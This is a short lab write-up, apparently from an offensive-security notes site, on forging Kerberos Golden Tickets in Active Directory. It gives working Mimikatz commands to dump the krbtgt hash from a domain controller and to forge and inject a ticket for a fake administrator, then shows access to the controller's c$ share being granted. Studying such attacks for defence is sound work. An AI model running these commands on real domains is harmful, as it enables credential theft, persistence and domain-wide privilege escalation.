---
description: Persistence and Privilege Escalation with Golden Kerberots tickets
---

# Kerberos - Golden Tickets

This lab explores an attack on Active Directory Kerberos Authentication. To be more precise - an attack that forges Kerberos Ticket Granting Tickets \(TGT\) that are used to authenticate users with Kerberos. TGTs are used when requesting Ticket Granting Service \(TGS\) tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.

This attack assumes a Domain Controller compromise where `KRBTGT` account hash will be extracted which is a requirement for a successful Golden Ticket attack.

## Execution <a id="execution"></a>

Extracting the krbtgt account's password `NTLM` hash:

```text
attacker@victim-dcmimikatz # lsadump::lsa /inject /name:krbtgt
```

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKTT282cu6cNUIpWW11%2F-LKTTGoQCPbfhNOZvn0j%2Fkerberos-golden-krbtgt-hash.png?alt=media&token=5dfb4acb-2195-4df6-9114-e52fcae00bae)

Creating a forged golden ticket that automatically gets injected in current logon session's memory:

```text
attacker@victim-workstationmimikatz # kerberos::golden /domain:offense.local /sid:S-1-5-21-4172452648-1021989953-2368502130 /rc4:8584cfccd24f6a7f49ee56355d41bd30 /user:newAdmin /id:500 /ptt
```

![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKTT282cu6cNUIpWW11%2F-LKTThyikYYAfLYaxQHH%2Fkerberos-golden-create.png?alt=media&token=35e44950-4407-43fa-a6bf-67dc9096d6b2)

Checking if the ticket got created:![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKTT282cu6cNUIpWW11%2F-LKTTt1PNSbb4q3pKN__%2Fkerberos-golden-klist.png?alt=media&token=6269071e-dd35-488a-bd51-953d56926c35)

Opening another powershell console with low privileged account and trying to mount a `c$` share of `pc-mantvydas` and `dc-mantvydas` - not surprisingly, returns access denied:![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKTT282cu6cNUIpWW11%2F-LKTUC-jFCwRhZEmHe4f%2Fkerberos-golden-denied.png?alt=media&token=6d243cc0-09de-40e4-b55d-0729c7f6eefd)

However, switching back to the console the attacker used to create the golden ticket \(local admin\) and again attempting to access `c$` share of the domain controller - this time is a success:![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LKTT282cu6cNUIpWW11%2F-LKTUnwdX3d7NvIED1zX%2Fkerberos-golden-granted.png?alt=media&token=0c6c25a9-de40-430c-951c-e4ffddeb818c)

